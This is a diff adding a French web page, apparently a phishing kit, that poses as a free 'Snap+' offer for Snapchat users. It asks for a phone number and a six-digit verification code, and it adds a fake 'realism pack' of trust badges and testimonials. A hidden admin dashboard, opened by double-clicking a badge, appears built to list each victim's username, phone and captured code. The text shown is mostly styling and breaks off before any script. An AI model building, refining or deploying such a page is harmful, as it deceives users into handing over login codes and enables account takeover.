@@ -1,0 +1,1243 @@
+<!DOCTYPE html><html lang="fr"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snap+ — Accès Gratuit</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&amp;family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&amp;display=swap" rel="stylesheet">
+<style>*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}:root{--bg:#0a0a0f;--bg2:#111118;--card:#16161f;--card2:#1c1c28;--border:rgba(255,255,255,0.08);--border2:rgba(255,255,255,0.15);--accent:#FFFC00;--accent2:#FFE600;--accent-glow:rgba(255,252,0,0.12);--text:#f0f0f8;--muted:#8888a0;--faint:#555568;--red:#ff4d6d;--red-glow:rgba(255,77,109,0.12);--yellow:#ffd166;--yellow-glow:rgba(255,209,102,0.12)}html{scroll-behavior:smooth}body{background:var(--bg);color:var(--text);font-family:'DM Sans',sans-serif;min-height:100vh;overflow-x:hidden}body::before{content:'';position:fixed;top:-200px;left:50%;transform:translateX(-50%);width:800px;height:800px;background:radial-gradient(circle,rgba(255,252,0,0.06) 0%,transparent 65%);pointer-events:none;z-index:0}.hidden{display:none !important}@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.8)}}@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}@keyframes popIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}#landingPage{display:block}nav{position:fixed;top:0;left:0;right:0;padding:1rem 2rem;display:flex;align-items:center;justify-content:space-between;background:rgba(10,10,15,0.85);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);z-index:100}.nav-logo{display:flex;align-items:center;gap:10px;font-family:'Syne',sans-serif;font-size:1.3rem;font-weight:800;color:var(--text);text-decoration:none}.nav-logo .bolt{width:36px;height:36px;background:var(--accent);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.1rem}.plus-tag{background:var(--accent);color:#000;font-size:0.65rem;font-weight:700;padding:2px 7px;border-radius:4px;letter-spacing:0.05em}.nav-badge{display:flex;align-items:center;gap:6px;background:rgba(255,252,0,0.1);border:1px solid rgba(255,252,0,0.3);color:var(--accent);padding:6px 14px;border-radius:100px;font-size:0.82rem;font-weight:500;cursor:default;user-select:none}.nav-badge::before{content:'';width:7px;height:7px;background:var(--accent);border-radius:50%;animation:pulse 2s infinite}.hero{position:relative;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:7rem 1.5rem 4rem;text-align:center;z-index:1}.hero-eyebrow{display:inline-flex;align-items:center;gap:8px;background:var(--card);border:1px solid var(--border2);color:var(--muted);font-size:0.82rem;padding:6px 16px;border-radius:100px;margin-bottom:2rem;animation:fadeUp 0.6s ease both}.hero-eyebrow span{color:var(--accent);font-weight:500}.hero-title{font-family:'Syne',sans-serif;font-size:clamp(2.8rem,7vw,5.5rem);font-weight:800;line-height:1.05;margin-bottom:1.5rem;animation:fadeUp 0.6s 0.1s ease both}.hero-title .green{color:var(--accent)}.hero-sub{font-size:1.15rem;color:var(--muted);max-width:520px;line-height:1.7;margin-bottom:3rem;font-weight:300;animation:fadeUp 0.6s 0.2s ease both}.hero-cta{animation:fadeUp 0.6s 0.3s ease both}.btn-main{display:inline-flex;align-items:center;gap:10px;background:var(--accent);color:#000;font-family:'Syne',sans-serif;font-weight:700;font-size:1rem;padding:16px 36px;border-radius:100px;border:none;cursor:pointer;transition:transform 0.2s,box-shadow 0.2s;box-shadow:0 0 40px rgba(255,252,0,0.3);text-decoration:none}.btn-main:hover{transform:translateY(-2px);box-shadow:0 0 60px rgba(255,252,0,0.45)}.btn-main:active{transform:scale(0.97)}.free-note{display:block;margin-top:14px;font-size:0.82rem;color:var(--faint)}.free-note strong{color:var(--accent)}.features{position:relative;z-index:1;padding:2rem 1.5rem 6rem;max-width:1000px;margin:0 auto}.features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:20px;overflow:hidden;animation:fadeUp 0.6s 0.4s ease both}.feat{background:var(--card);padding:2rem;transition:background 0.2s}.feat:hover{background:#1c1c28}.feat h3{font-family:'Syne',sans-serif;font-size:1rem;font-weight:700;margin-bottom:6px;color:var(--text)}.feat p{font-size:0.88rem;color:var(--muted);line-height:1.6;font-weight:300}footer{position:relative;z-index:1;text-align:center;padding:2rem;border-top:1px solid var(--border);color:var(--faint);font-size:0.82rem}footer span{color:var(--accent)}.overlay{position:fixed;inset:0;background:var(--bg);z-index:200;display:flex;align-items:center;justify-content:center;padding:2rem 1rem;opacity:0;pointer-events:none;transition:opacity 0.4s}.overlay.open{opacity:1;pointer-events:all}.modal{background:transparent;width:100%;max-width:480px;padding:0;transform:translateY(24px);transition:transform 0.4s ease;position:relative}.overlay.open .modal{transform:translateY(0)}.modal-logo{display:flex;align-items:center;gap:10px;font-family:'Syne',sans-serif;font-size:1.2rem;font-weight:800;margin-bottom:2.5rem}.modal-logo .bolt{width:34px;height:34px;background:var(--accent);border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:1rem}.modal-close{position:absolute;top:0;right:0;background:rgba(255,255,255,0.06);border:1px solid var(--border);color:var(--muted);cursor:pointer;font-size:1rem;line-height:1;transition:color 0.2s,background 0.2s;width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center}.modal-close:hover{color:var(--text);background:rgba(255,255,255,0.1)}.cooldown-wrap{margin-bottom:1.25rem;display:none}.cooldown-wrap.active{display:block}.cooldown-info{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;font-size:0.8rem;color:var(--muted)}.cooldown-info .cd-timer{font-family:'Syne',sans-serif;font-weight:700;color:var(--accent);font-size:0.9rem}.cooldown-bar-wrap{width:100%;height:4px;background:var(--border);border-radius:99px;overflow:hidden}.cooldown-bar{height:100%;background:var(--accent);border-radius:99px;width:100%;transition:width 1s linear}.steps-nav{display:flex;align-items:center;gap:0;margin-bottom:2rem}.step-dot{display:flex;flex-direction:column;align-items:center;gap:5px;flex:1}.dot-circle{width:32px;height:32px;border-radius:50%;border:1.5px solid var(--faint);display:flex;align-items:center;justify-content:center;font-size:0.82rem;font-weight:600;color:var(--faint);transition:all 0.3s;font-family:'Syne',sans-serif}.dot-circle.active{background:var(--accent);border-color:var(--accent);color:#000}.dot-circle.done{background:rgba(255,252,0,0.15);border-color:var(--accent);color:var(--accent)}.dot-label{font-size:0.72rem;color:var(--faint);text-align:center;transition:color 0.3s}.dot-label.active{color:var(--accent)}.step-line{flex:1;height:1px;background:var(--faint);margin:0 4px;margin-bottom:18px;transition:background 0.3s}.step-line.done{background:var(--accent)}.modal-title{font-family:'Syne',sans-serif;font-size:1.5rem;font-weight:800;margin-bottom:6px;color:var(--text)}.warn-banner{background:rgba(255,209,102,0.08);border:1.5px solid rgba(255,209,102,0.35);border-radius:14px;color:var(--yellow);font-family:'Syne',sans-serif;font-weight:700;font-size:1.05rem;line-height:1.4;padding:16px 20px;margin-bottom:1.75rem;text-align:center;letter-spacing:0.01em}.modal-sub{font-size:0.88rem;color:var(--muted);margin-bottom:1.75rem;line-height:1.6;font-weight:300}.modal-sub strong{color:var(--text);font-weight:500}.field-label{display:block;font-size:0.8rem;color:var(--muted);margin-bottom:6px;font-weight:500;letter-spacing:0.03em;text-transform:uppercase}.phone-row{display:flex;gap:8px;margin-bottom:1.5rem}.country-sel{flex-shrink:0;background:#1f1f2e;border:1px solid var(--border2);color:var(--text);border-radius:12px;padding:12px 10px;font-family:'DM Sans',sans-serif;font-size:0.9rem;cursor:pointer;outline:none}.phone-input{flex:1;background:#1f1f2e;border:1px solid var(--border2);color:var(--text);border-radius:12px;padding:12px 16px;font-family:'DM Sans',sans-serif;font-size:1rem;outline:none;transition:border-color 0.2s}.phone-input:focus{border-color:var(--accent)}.phone-input.error{border-color:var(--red)}.phone-input::placeholder{color:var(--faint)}.error-msg{font-size:0.8rem;color:var(--red);margin-top:-10px;margin-bottom:1rem;display:none}.code-grid{display:flex;gap:8px;justify-content:center;margin-bottom:1rem}.code-box{width:50px;height:60px;background:#1f1f2e;border:1.5px solid var(--border2);border-radius:12px;text-align:center;font-family:'Syne',sans-serif;font-size:1.5rem;font-weight:700;color:var(--text);caret-color:var(--accent);outline:none;transition:border-color 0.2s,box-shadow 0.2s}.code-box:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-glow)}.resend-row{text-align:center;font-size:0.83rem;color:var(--faint);margin-bottom:1.5rem}.resend-row a{color:var(--accent);cursor:pointer;text-decoration:none}.resend-row a:hover{text-decoration:underline}.btn-submit{width:100%;padding:14px;background:var(--accent);color:#000;font-family:'Syne',sans-serif;font-weight:700;font-size:1rem;border:none;border-radius:12px;cursor:pointer;transition:opacity 0.2s,transform 0.1s,box-shadow 0.2s;box-shadow:0 0 30px rgba(255,252,0,0.2)}.btn-submit:hover:not(:disabled){box-shadow:0 0 40px rgba(255,252,0,0.4)}.btn-submit:active:not(:disabled){transform:scale(0.98)}.btn-submit:disabled{opacity:0.35;cursor:not-allowed}.privacy-note{text-align:center;font-size:0.75rem;color:var(--faint);margin-top:12px}.success-area{text-align:center;padding:1rem 0}.success-ring{width:80px;height:80px;border-radius:50%;background:rgba(255,252,0,0.1);border:2px solid var(--accent);display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem;font-size:2rem;animation:popIn 0.5s cubic-bezier(0.34,1.56,0.64,1) both}.success-title{font-family:'Syne',sans-serif;font-size:1.6rem;font-weight:800;margin-bottom:8px}.success-sub{color:var(--muted);font-size:0.9rem;line-height:1.6;margin-bottom:1.5rem;font-weight:300}.activated-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(255,252,0,0.12);border:1px solid rgba(255,252,0,0.35);color:var(--accent);font-family:'Syne',sans-serif;font-weight:700;font-size:0.95rem;padding:10px 22px;border-radius:100px;margin-bottom:1.5rem;animation:fadeUp 0.5s 0.3s ease both}.close-btn{background:none;border:1px solid var(--border2);color:var(--muted);border-radius:10px;padding:10px 24px;font-family:'DM Sans',sans-serif;font-size:0.9rem;cursor:pointer;transition:border-color 0.2s,color 0.2s}.close-btn:hover{border-color:var(--text);color:var(--text)}@media (max-width:500px){.modal{padding:1.75rem 1.25rem;border-radius:20px}.hero-title{font-size:2.4rem}.code-box{width:42px;height:52px;font-size:1.3rem}}#adminPage{display:none}.login-wrap{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;padding:1rem;z-index:10;background:var(--bg)}.login-card{background:var(--card);border:1px solid var(--border2);border-radius:24px;padding:2.5rem;width:100%;max-width:380px;text-align:center}.login-logo{display:inline-flex;align-items:center;gap:10px;font-family:'Syne',sans-serif;font-size:1.3rem;font-weight:800;margin-bottom:1.5rem}.login-logo .bolt{width:36px;height:36px;background:var(--accent);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.1rem}.login-title{font-family:'Syne',sans-serif;font-size:1.4rem;font-weight:800;margin-bottom:6px}.login-sub{font-size:0.85rem;color:var(--muted);margin-bottom:1.75rem;font-weight:300}.login-input{width:100%;background:#1f1f2e;border:1px solid var(--border2);color:var(--text);border-radius:12px;padding:13px 16px;font-family:'DM Sans',sans-serif;font-size:1rem;outline:none;text-align:center;letter-spacing:0.15em;margin-bottom:1rem;transition:border-color 0.2s}.login-input:focus{border-color:var(--accent)}.login-input.error{border-color:var(--red);animation:shake 0.4s ease}.login-err{font-size:0.82rem;color:var(--red);margin-bottom:1rem;display:none}.btn-login{width:100%;padding:13px;background:var(--accent);color:#000;font-family:'Syne',sans-serif;font-weight:700;font-size:0.95rem;border:none;border-radius:12px;cursor:pointer;transition:opacity 0.2s,transform 0.1s;box-shadow:0 0 30px rgba(255,252,0,0.2)}.btn-login:hover{opacity:0.9}.btn-login:active{transform:scale(0.98)}.admin-wrap{display:none;min-height:100vh}.sidebar{position:fixed;top:0;left:0;bottom:0;width:240px;background:var(--card);border-right:1px solid var(--border);padding:1.5rem 1rem;display:flex;flex-direction:column;z-index:50}.sidebar-logo{display:flex;align-items:center;gap:10px;font-family:'Syne',sans-serif;font-size:1.1rem;font-weight:800;margin-bottom:2rem;padding:0 0.5rem}.sidebar-logo .bolt{width:32px;height:32px;background:var(--accent);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1rem;flex-shrink:0}.nav-item{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:10px;font-size:0.9rem;color:var(--muted);cursor:pointer;transition:background 0.2s,color 0.2s;margin-bottom:4px;border:none;background:none;width:100%;text-align:left}.nav-item:hover{background:var(--card2);color:var(--text)}.nav-item.active{background:var(--accent-glow);color:var(--accent)}.nav-item .icon{font-size:1rem;width:20px;text-align:center}.sidebar-footer{margin-top:auto}.btn-logout{display:flex;align-items:center;gap:8px;width:100%;padding:10px 12px;background:none;border:1px solid var(--border2);color:var(--muted);border-radius:10px;font-family:'DM Sans',sans-serif;font-size:0.85rem;cursor:pointer;transition:border-color 0.2s,color 0.2s}.btn-logout:hover{border-color:var(--red);color:var(--red)}.btn-back-landing{display:flex;align-items:center;gap:8px;width:100%;padding:10px 12px;background:none;border:1px solid var(--border);color:var(--faint);border-radius:10px;font-family:'DM Sans',sans-serif;font-size:0.85rem;cursor:pointer;transition:border-color 0.2s,color 0.2s;margin-bottom:6px}.btn-back-landing:hover{border-color:var(--accent);color:var(--accent)}.admin-main{margin-left:240px;padding:2rem;min-height:100vh}.page{display:none}.page.active{display:block}.page-title{font-family:'Syne',sans-serif;font-size:1.6rem;font-weight:800;margin-bottom:4px}.page-sub{font-size:0.85rem;color:var(--muted);margin-bottom:2rem}.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem;margin-bottom:2rem}.stat-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.25rem 1.5rem}.stat-label{font-size:0.75rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:8px}.stat-value{font-family:'Syne',sans-serif;font-size:2rem;font-weight:800;line-height:1;margin-bottom:4px}.stat-value.green{color:var(--accent)}.stat-value.yellow{color:var(--yellow)}.stat-value.red{color:var(--red)}.stat-sub{font-size:0.75rem;color:var(--faint)}.table-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem}.table-title{font-family:'Syne',sans-serif;font-size:1rem;font-weight:700}.btn-refresh{display:flex;align-items:center;gap:6px;background:none;border:1px solid var(--border2);color:var(--muted);border-radius:8px;padding:6px 12px;font-size:0.8rem;cursor:pointer;transition:color 0.2s,border-color 0.2s;font-family:'DM Sans',sans-serif}.btn-refresh:hover{color:var(--text);border-color:var(--accent)}.entries-list{display:flex;flex-direction:column;gap:10px}.entry-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:1rem 1.25rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;transition:border-color 0.2s}.entry-card:hover{border-color:var(--border2)}.entry-card.validated{border-left:3px solid var(--accent)}.entry-card.pending{border-left:3px solid var(--yellow)}.entry-left{display:flex;flex-direction:column;gap:4px}.entry-snap{font-family:'Syne',sans-serif;font-weight:700;font-size:0.95rem;display:flex;align-items:center;gap:6px}.entry-phone{font-size:0.85rem;color:var(--muted)}.entry-right{display:flex;align-items:center;gap:12px;flex-wrap:wrap}.code-display{background:var(--accent-glow);border:1px solid rgba(255,252,0,0.2);border-radius:8px;padding:6px 14px;font-family:'Syne',sans-serif;font-weight:800;font-size:1.3rem;letter-spacing:0.2em;color:var(--accent)}.code-display.pending-code{background:var(--yellow-glow);border-color:rgba(255,209,102,0.2);color:var(--yellow);font-size:0.8rem;font-weight:400;letter-spacing:0}.status-badge{font-size:0.75rem;padding:4px 10px;border-radius:100px;font-weight:500}.status-badge.validated{background:var(--accent-glow);border:1px solid rgba(255,252,0,0.2);color:var(--accent)}.status-badge.pending{background:var(--yellow-glow);border:1px solid rgba(255,209,102,0.2);color:var(--yellow)}.entry-time{font-size:0.75rem;color:var(--faint)}.btn-delete{background:none;border:none;color:var(--faint);cursor:pointer;font-size:1rem;transition:color 0.2s;padding:4px}.btn-delete:hover{color:var(--red)}.empty-state{text-align:center;padding:4rem 2rem;color:var(--muted)}.empty-state .icon{font-size:3rem;margin-bottom:1rem}.empty-state p{font-size:0.9rem}.search-bar{width:100%;background:var(--card);border:1px solid var(--border2);color:var(--text);border-radius:12px;padding:10px 16px;font-family:'DM Sans',sans-serif;font-size:0.9rem;outline:none;margin-bottom:1rem;transition:border-color 0.2s}.search-bar:focus{border-color:var(--accent)}.search-bar::placeholder{color:var(--faint)}.settings-section{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.5rem;margin-bottom:1rem}.settings-title{font-family:'Syne',sans-serif;font-weight:700;font-size:0.95rem;margin-bottom:1rem;padding-bottom:0.75rem;border-bottom:1px solid var(--border)}.settings-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid var(--border);font-size:0.88rem}.settings-row:last-child{border-bottom:none}.settings-row .label{color:var(--muted)}.settings-row .val{color:var(--text);font-weight:500}.settings-row .val.green{color:var(--accent)}.refresh-dot{width:7px;height:7px;background:var(--accent);border-radius:50%;display:inline-block;animation:pulseDot 2s infinite;margin-right:4px}@keyframes pulseDot{0%,100%{opacity:1}50%{opacity:0.3}}@media (max-width:700px){.sidebar{transform:translateX(-100%);transition:transform 0.3s}.sidebar.open{transform:translateX(0)}.admin-main{margin-left:0;padding:1.25rem}.mobile-nav{display:flex !important}.admin-main{padding-top:4.5rem}}.mobile-nav{display:none;position:fixed;top:0;left:0;right:0;background:var(--card);border-bottom:1px solid var(--border);padding:1rem 1.25rem;align-items:center;justify-content:space-between;z-index:40}.mobile-nav-title{font-family:'Syne',sans-serif;font-weight:800;font-size:1rem}.btn-menu{background:none;border:none;color:var(--text);font-size:1.3rem;cursor:pointer}.nav-logo .bolt,.modal-logo .bolt,.login-logo .bolt,.sidebar-logo .bolt{box-shadow:0 4px 18px rgba(255,252,0,0.35);transition:transform .25s ease,box-shadow .25s ease}.nav-logo:hover .bolt{transform:rotate(-6deg) scale(1.06)}.btn-main{letter-spacing:0.01em;background:linear-gradient(180deg,#FFFC00 0%,#FFE600 100%)}.btn-main:hover{transform:translateY(-3px) scale(1.02)}.btn-submit{background:linear-gradient(180deg,#FFFC00 0%,#FFE600 100%);letter-spacing:0.01em}.btn-submit:hover:not(:disabled){transform:translateY(-1px)}.feat{transition:background .2s,transform .2s}.feat:hover{transform:translateY(-2px)}.hero-title .green{background:linear-gradient(180deg,#FFFC00 0%,#FFE600 100%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}body::before{background:radial-gradient(circle,rgba(255,252,0,0.10) 0%,transparent 65%)}.plus-tag{box-shadow:0 2px 8px rgba(255,252,0,0.4)}.nav-badge{backdrop-filter:blur(10px)}.dot-circle.active{box-shadow:0 0 0 4px rgba(255,252,0,0.18)}.code-box:focus{transform:translateY(-1px)}.modal-close:hover{transform:rotate(90deg);transition:transform .25s}
+  /* SNAP+ FULLSCREEN MODAL */
+  .overlay { background: #FFFC00; padding: 0; }
+  .overlay::before {
+    content: ""; position: absolute; inset: 0;
+    background:
+      radial-gradient(circle at 20% 10%, rgba(255,255,255,0.45) 0%, transparent 40%),
+      radial-gradient(circle at 80% 90%, rgba(0,0,0,0.08) 0%, transparent 45%);
+    pointer-events: none;
+  }
+  .modal {
+    background: #0a0a0f;
+    max-width: 540px;
+    width: calc(100% - 2rem);
+    max-height: calc(100vh - 2rem);
+    overflow-y: auto;
+    padding: 2.25rem 2rem;
+    border-radius: 28px;
+    border: 1px solid rgba(0,0,0,0.15);
+    box-shadow: 0 30px 80px rgba(0,0,0,0.35), 0 0 0 8px rgba(0,0,0,0.04);
+    position: relative;
+    z-index: 2;
+  }
+  .modal::-webkit-scrollbar { width: 6px; }
+  .modal::-webkit-scrollbar-thumb { background: rgba(255,252,0,0.4); border-radius: 99px; }
+  .modal-close {
+    background: #000; color: #FFFC00; border: none;
+    width: 38px; height: 38px;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+  }
+  .modal-close:hover { background: #fff; color: #000; }
+  @media (max-width: 500px) {
+    .modal { width: 100%; height: 100vh; max-height: 100vh; border-radius: 0; padding: 1.5rem 1.25rem; border: none; }
+    .overlay { padding: 0; }
+  }
+  /* Step 4 success — Snap-style celebration */
+  #step4 .success-ring { background: #FFFC00; border-color: #000; color: #000; box-shadow: 0 12px 30px rgba(0,0,0,0.25); }
+
+
+  /* SNAP+ REALISM PACK */
+  :root { --accent: #FFFC00; --accent2: #FFE600; }
+  .modal { max-width: 640px !important; padding: 2.5rem 2.25rem !important; background: linear-gradient(180deg, #0e0e16 0%, #07070b 100%) !important; border: 1px solid rgba(255,252,0,0.18) !important; border-radius: 28px !important; box-shadow: 0 30px 90px rgba(0,0,0,0.5), 0 0 60px rgba(255,252,0,0.08) inset !important; }
+  .modal-title { font-size: 2rem !important; }
+  .modal-sub { font-size: 0.98rem !important; }
+  .btn-submit { padding: 18px !important; font-size: 1.05rem !important; border-radius: 14px !important; }
+  .warn-banner { font-size: 0.98rem !important; }
+  .field-label { font-size: 0.85rem !important; }
+  .phone-input, .country-sel, #snapInput { padding: 14px 18px !important; font-size: 1.05rem !important; border-radius: 14px !important; }
+  .code-box { width: 58px !important; height: 68px !important; font-size: 1.7rem !important; border-radius: 14px !important; }
+  .modal-logo { font-size: 1.5rem !important; }
+  .modal-logo .bolt { width: 42px !important; height: 42px !important; box-shadow: 0 6px 20px rgba(255,252,0,0.45) !important; }
+  .dot-circle { width: 38px !important; height: 38px !important; font-size: 0.95rem !important; }
+  .dot-label { font-size: 0.8rem !important; }
+  /* Trust */
+  .trust-row { display:flex; gap:8px; flex-wrap:wrap; justify-content:center; margin-top: 1.25rem; }
+  .trust-chip { background: rgba(255,252,0,0.08); border: 1px solid rgba(255,252,0,0.25); color: #fff; font-size: 0.8rem; padding: 6px 12px; border-radius: 100px; display:inline-flex; align-items:center; gap:6px; }
+  .trust-chip strong { color: #FFFC00; font-weight: 700; }
+  .testi { display:grid; gap:10px; margin-top: 1.5rem; }
+  .testi-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 14px; padding: 0.85rem 1rem; }
+  .testi-head { display:flex; align-items:center; gap:10px; margin-bottom: 6px; font-size: 0.85rem; }
+  .testi-head strong { color: #fff; font-weight: 600; }
+  .testi-sub { font-size: 0.72rem; color: rgba(255,255,255,0.5); }
+  .avatar { width: 32px; height: 32px; border-radius: 50%; background: #00ccff; color:#000; display:flex; align-items:center; justify-content:center; font-family:'Syne',sans-serif; font-weight:800; font-size:0.85rem; flex-shrink:0; }
+  .verified { margin-left:auto; background: rgba(255,252,0,0.15); color:#FFFC00; font-size:0.7rem; padding: 3px 8px; border-radius: 100px; font-weight: 600; }
+  .testi-card p { color: rgba(255,255,255,0.85); font-size: 0.88rem; line-height:1.5; margin-top: 4px; }
+  /* Info list */
+  .info-list { display:flex; flex-direction:column; gap:10px; margin-top: 1.25rem; padding: 1rem 1.1rem; background: rgba(255,252,0,0.06); border: 1px solid rgba(255,252,0,0.18); border-radius: 14px; }
+  .info-item { display:flex; align-items:flex-start; gap:10px; font-size: 0.88rem; color: rgba(255,255,255,0.85); line-height: 1.5; }
+  .info-ic { font-size: 1.05rem; flex-shrink: 0; }
+  .info-item strong { color: #FFFC00; font-weight: 700; }
+  /* Cooldown fullscreen page */
+  .cooldown-page { position: absolute; inset: 0; background: #07070b; display: none; flex-direction:column; align-items:center; justify-content:center; z-index: 5; border-radius: inherit; padding: 2.5rem 2rem; text-align:center; overflow:hidden; }
+  .cooldown-page.active { display:flex; animation: fadeUp 0.3s ease; }
+  .cd-bg { position:absolute; inset:0; background:
+    radial-gradient(circle at 50% 30%, rgba(255,252,0,0.18) 0%, transparent 55%),
+    radial-gradient(circle at 20% 80%, rgba(255,252,0,0.08) 0%, transparent 50%);
+    pointer-events:none; }
+  .cd-content { position:relative; z-index:2; max-width: 460px; width:100%; }
+  .cd-ghost { animation: float 3s ease-in-out infinite; filter: drop-shadow(0 12px 30px rgba(255,252,0,0.5)); margin-bottom: 1.25rem; }
+  @keyframes float { 0%,100% { transform: translateY(0) rotate(-2deg);} 50% { transform: translateY(-12px) rotate(2deg);} }
+  .cd-eyebrow { font-family:'Syne',sans-serif; font-size:0.78rem; letter-spacing:0.18em; text-transform:uppercase; color:#FFFC00; margin-bottom:8px; }
+  .cd-title { font-family:'Syne',sans-serif; font-size:1.6rem; font-weight:800; color:#fff; margin-bottom: 1.25rem; line-height:1.25; }
+  .cd-timer-big { font-family:'Syne',sans-serif; font-size:4.5rem; font-weight:800; color:#FFFC00; line-height:1; margin-bottom: 1rem; text-shadow: 0 0 40px rgba(255,252,0,0.5); }
+  .cd-progress-wrap { width:100%; height: 8px; background: rgba(255,255,255,0.08); border-radius:99px; overflow:hidden; margin-bottom: 1.25rem; }
+  .cd-progress-bar { height:100%; width:100%; background: linear-gradient(90deg, #FFFC00, #FFE600); border-radius:99px; transition: width 1s linear; box-shadow: 0 0 14px rgba(255,252,0,0.5); }
+  .cd-msg { color: rgba(255,255,255,0.7); font-size: 0.92rem; margin-bottom: 1.5rem; min-height: 22px; }
+  .cd-checks { display:flex; flex-direction:column; gap:10px; text-align:left; padding: 1rem 1.1rem; background: rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.08); border-radius: 14px; margin-bottom: 1.25rem; }
+  .cd-check { font-size: 0.88rem; color: rgba(255,255,255,0.6); display:flex; align-items:center; gap:10px; transition: color .3s; }
+  .cd-check.done { color: #fff; }
+  .cd-check.done .cd-spin { display:none; }
+  .cd-check.done::before { content:"✓"; color:#FFFC00; font-weight:800; font-size:1rem; }
+  .cd-check.active { color:#fff; }
+  .cd-spin { width:14px; height:14px; border:2px solid rgba(255,252,0,0.25); border-top-color: #FFFC00; border-radius:50%; animation: spin 0.8s linear infinite; }
+  .cd-dot { width:8px; height:8px; background: rgba(255,255,255,0.2); border-radius:50%; }
+  @keyframes spin { to { transform: rotate(360deg);} }
+  .cd-foot { font-size: 0.78rem; color: rgba(255,255,255,0.4); }
+  @media (max-width:600px) {
+    .cd-title { font-size:1.3rem;}
+    .cd-timer-big { font-size:3.5rem;}
+    .modal { padding: 1.5rem 1.25rem !important; }
+    .modal-title { font-size:1.5rem !important; }
+  }
+
+</style>
+</head>
+<body>
+<div id="landingPage">
+  <nav>
+    <a class="nav-logo" href="#">
+      <div class="bolt"><svg viewBox="0 0 64 64" width="62%" height="62%" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M32 5c-10.3 0-17.5 7.6-17.5 18.4v17.4l-3.7 4.9c-.6.8-.1 2 .9 2.2l3.6.6-.5 2.6c-.2.8.6 1.5 1.4 1.3l4.6-1.1 4.4 4.5c.5.5 1.3.6 1.8.1L32 52.4l4.9 3.5c.6.4 1.4.4 1.9-.1l4.4-4.5 4.6 1.1c.8.2 1.6-.5 1.4-1.3l-.5-2.6 3.6-.6c1-.2 1.5-1.4.9-2.2l-3.7-4.9V23.4C49.5 12.6 42.3 5 32 5z" fill="#000"></path><circle cx="24" cy="29" r="3.2" fill="#FFFC00"></circle><circle cx="40" cy="29" r="3.2" fill="#FFFC00"></circle></svg></div>
+      Snap<span class="plus-tag">+</span>
+    </a>
+    <div class="nav-badge" ondblclick="goToAdmin()" title="">Offre de lancement</div>
+  </nav>
+  <section class="hero">
+    <div style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,209,102,0.08);border:1.5px solid rgba(255,209,102,0.3);border-radius:12px;padding:10px 18px;margin-bottom:1.25rem;animation:fadeUp 0.6s ease both;">
+      <span style="font-size:1rem;">📶</span>
+      <span style="font-family:'Syne',sans-serif;font-weight:700;font-size:0.9rem;color:#ffd166;">Fonctionne uniquement avec <strong>Bouygues</strong>, <strong>SFR</strong> et <strong>Orange</strong></span>
+    </div>
+    <div class="hero-eyebrow">
+      👻 Réservé aux membres Snapchat
+    </div>
+    <h1 class="hero-title">
+      Obtiens<br><span class="green">Snap+ Gratuit.</span>
+    </h1>
+    <p class="hero-sub">
+      Accède à Snap+ sans abonnement payant. <strong>Vérifie ton identité en 30 secondes.</strong>
+    </p>
+    <div style="display:inline-flex;align-items:center;gap:10px;background:rgba(255,252,0,0.1);border:1.5px solid rgba(255,252,0,0.35);border-radius:14px;padding:10px 20px;margin-bottom:2rem;animation:fadeUp 0.6s 0.25s ease both;">
+      <div style="width:32px;height:32px;background:var(--accent);border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#000;font-size:1.1rem;">👻</div>
+      <span style="font-family:'Syne',sans-serif;font-size:1rem;font-weight:700;color:var(--accent);">Snap <span style="background:var(--accent);color:#000;padding:1px 7px;border-radius:5px;font-size:0.85rem;margin-left:2px;">+</span> <span style="color:var(--text);font-weight:400;font-size:0.9rem;margin-left:6px;">Offert</span></span>
+    </div>
+    <div class="hero-cta">
+      <button class="btn-main" onclick="openModal()">
+        👻 Activer Snap+ Gratuit
+      </button>
+      <span class="free-note">✓ <strong>Sans carte bancaire</strong> · Sans engagement · Activation en 30s</span>
+    </div>
+  </section>
+  <section class="features">
+    <div style="text-align:center; margin-bottom:2rem;">
+      <span style="font-family:'Syne',sans-serif; font-size:0.82rem; color:var(--muted); text-transform:uppercase; letter-spacing:0.1em;">Comment ça marche</span>
+      <h2 style="font-family:'Syne',sans-serif; font-size:1.8rem; font-weight:800; margin-top:8px;">Accède à Snap+ sans abonnement</h2>
+    </div>
